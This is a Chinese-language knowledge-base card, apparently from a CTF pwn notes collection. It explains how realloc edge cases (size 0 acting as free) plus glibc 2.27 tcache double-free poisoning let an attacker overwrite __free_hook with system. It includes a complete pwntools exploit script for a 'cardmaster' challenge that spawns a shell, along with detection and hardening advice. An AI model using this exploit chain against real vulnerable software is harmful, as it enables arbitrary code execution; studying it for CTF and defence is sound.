---
id: binary-pwn-heap-realloc-size0-free-tcache-dup-freehook
title: 用 realloc 的边界语义当原语：size 自选 → size=0 等价 free 造 unsorted bin 泄 libc，再靠 2.27 tcache 无 double-free 检查把 free_hook 写成 system
type: scenario
domain: binary
path: binary/pwn/heap
technique: realloc-size-zero-free-tcache-dup-freehook
tags:
- pwn
- heap
- realloc
- tcache
- double-free
- unsorted-bin
- free-hook
- glibc-2.27
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W10
  verified_at: '2026-11-09T04:56:45+08:00'
  notes: 已对照原文核对；本次核对未读取图片；realloc 四条边界语义（size==0 等价 free 且返回 NULL、ptr==NULL 等价 malloc、usable>=size 原地、usable<size 重分配并 free 旧块）、大块进 unsorted bin 泄 libc 后需重新初始化（否则 main_arena 残留指针让 r12 相加落到非法地址）、2.27 tcache 无 key 检查可 double free、投毒 __free_hook 后写成 system 并 free('/bin/sh') 均与正文一致；卡内「申请 >0x410 的块（如 0x1110）」的 0x1110 是示例值，原文只写「大于 0x410」、exp 传的是 set_info(0x110)，具体 size 语义需按二进制核对
url: /docs/binary/pwn/heap/binary-pwn-heap-realloc-size0-free-tcache-dup-freehook/
draft: false
kb_aliases:
- realloc size 0 等于 free
- realloc 边界语义
- cardmaster
- tcache double free 无检查
- free_hook system 2.27
---

## 一句话结论

题目只给「按用户给定 `size` 调一次 `realloc(ptr, size)`」，看似缺少 free/add 原语，但利用 `realloc` 的四条边界语义——`size == 0` 等价于 `free(ptr)` 且返回 NULL、`ptr == NULL && size > 0` 等价于 `malloc`、`usable >= size` 原地收缩、`usable < size` 重新分配并释放旧块——就能同时拿到「申请 / 释放 / 指定大小」三种能力：先用大块 + `size=0` 把它送进 unsorted bin 泄 libc，再用 2.27 对 tcache double-free 不做检查的缺陷把 `__free_hook` 链上并写成 `system`。

## 原理

- **`realloc` 是三种原语的合成体**：`realloc(NULL, n)` = `malloc(n)`；`realloc(p, 0)` = `free(p)` 并返回 NULL（不会 UAF，指针被清）；`realloc(p, n)` 在 `malloc_usable_size(p) >= n` 时原地返回同一指针，否则 `malloc` 新块 + `memcpy` + `free` 旧块。
- **关键在于「谁来 free」不可见**：程序只暴露一个 `realloc` 调用点，但攻击者传入 `size = 0` 就等价于拿到 `free`；传入 `ptr = NULL`（新初始化）就等价于拿到 `malloc`。于是缺 add/free 的题并不缺原语。
- **泄 libc**：申请一个大于 `0x410` 的块（如 `0x1110`），使其超过 tcache 上限、`free` 后进入 unsorted bin；再用 `size = 0` 把它 `free` 掉，`fd/bk` 指向 `main_arena`；第三次调用（题目有打印结构体的功能）读出该块内容，减偏移得 `libc_base`（本例 `0x3ebca0`）。
- **必须重新初始化**：`free` 掉大块后 `main_arena` 的 bin 链上留着指针，直接再申请会因为 `r12` 相加落到非法地址而崩；所以泄完 libc 要重新触发一次初始化函数，拿到新结构体再用。
- **tcache dup**：glibc 2.27 的 tcache 没有 `key` 字段、`free` 也不检查重复释放，所以对同一块 `free` 两次就能让 tcache 链表出现 `A→A`，两次 `malloc` 返回同一地址；把其中一次 `free` 前把 `fd` 改成 `__free_hook`，第二次 `malloc` 即返回 hook 地址。
- **细节坑**：投毒前后要保证「先 free 两个块再初始化」，否则初始化自己会把 `__free_hook` 那块申请走，导致后面的写落在别处。

## 触发条件

- 目标 glibc 2.27（或任何 tcache 无 `key` 检查的版本，≤2.28），或题目的 double-free 检查缺失。
- 程序暴露 `realloc` 且 `size`/指针初值由攻击者控制（能传 0 与新指针）。
- 有办法读回块内容（如打印结构体 / `show`）以泄 libc。
- 存在可再次触发的初始化/分配路径，用于重铺堆布局。

## 利用步骤

1. 审计确认唯一内存操作是 `realloc(ptr, size)`，且 `size` 完全来自输入。
2. 申请一个 `> 0x410` 的块（超过 tcache 上限），再以 `size = 0` 释放它 → 进入 unsorted bin。
3. 调用打印功能读该块，`libc.address = leak - 0x3ebca0`。
4. 重新调用初始化函数，获得新结构体（否则 `main_arena` 残留指针会让下一次 `realloc` 崩）。
5. 构造 tcache 链：申请两个同尺寸块并各 `free` 两次（2.27 无检查），把其中一次的 `fd` 覆写成 `__free_hook`。
6. 两次申请把 `__free_hook` 拿到手，写入 `system`（或 one_gadget）。
7. 申请一块写入 `/bin/sh`，再 `realloc(ptr, 0)` 触发 `free("/bin/sh")` → `system("/bin/sh")`。

## PoC

```python
from pwn import *
elf = ELF('./cardmaster'); libc = ELF('./libc.so.6')
p = process(elf.path)

def cmd(i): p.sendlineafter(b'>> ', str(i).encode())
def set_info(n, data=b'1'):
    cmd(2)
    p.sendlineafter(b'count:', str(n).encode())
    p.sendlineafter(b'range 1 - ?', b'0')      # size = 0 => free
    p.sendlineafter(b'level:', b'1000')
    if n != 0:
        p.sendlineafter(b'set:', data)

set_info(0x110, b'aaa')      # 大块
set_info(0)                  # size=0 -> free -> unsorted bin
cmd(3)                       # 打印结构体泄 libc
p.recvuntil(b'chara set:')
libc.address = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x3ebca0

cmd(1)                       # 重新初始化
set_info(10, b'bbb')         # 申请
set_info(0); set_info(0)     # 连续释放同一块 -> tcache dup（2.27 无检查）
set_info(10, b'a')
set_info(5, p64(libc.sym['__free_hook']))   # 覆写 fd 指向 hook
cmd(1)                       # 再次初始化，把 hook 申请出来
set_info(10, p64(libc.sym['system']))       # __free_hook = system
cmd(1)
set_info(10, b'/bin/sh\x00')
set_info(0)                  # free("/bin/sh") -> system("/bin/sh")
p.interactive()
```

## 变体与关联

- 变体：`realloc(p, 0)` 之外，`realloc(NULL, n)` 可当 `malloc`；`malloc_usable_size >= size` 时原地返回可用于「不搬移地缩小块」，进而让相邻块内容残留变成信息泄露。
- 变体：2.29+ tcache 引入 `key` 字段后 double free 会被检出，此时改走 `realloc` 触发的「旧块 free + 新块 malloc」顺序制造重叠，或打 fastbin dup。
- 关联：[[binary-pwn-heap-calloc-tcache-overlap-realloc-hook-onegadget]]（`realloc+3` + one_gadget 的 hook 组合）、[[binary-pwn-heap-size-field-overlap-freehook-after-free-reuse]]（改 size 造重叠泄 libc + `free_hook`）、[[ctf-pwn-menu-uaf-heap-overflow-tcache-poison-freehook-system]]（标准菜单题的 tcache 投毒）。
- 边界：若程序在 `size == 0` 时做特判（拒绝或改成 `malloc(0)`），该原语失效；若打印功能被去掉，则需另找泄露（`stdout` 部分覆写）。

## 检测与防御

- 检测（CTF/审计）：把用户可控 `size` 直接传给 `realloc` 且未做下限校验（`size = 0` 即 free，`size` 巨大即 `mmap`）；同一块被连续释放而链上无 `key` 校验。
- 修复：对 `size` 施加 `[min, max]` 区间与对齐校验；每次分配记录 `ptr → size`，释放后置空；不把内部指针/结构体直接打印给用户。
- 加固：升级 glibc ≥2.29（tcache key）、≥2.34（移除 `__free_hook`）；开启 `MALLOC_CHECK_` 与 tcache double-free 检测。
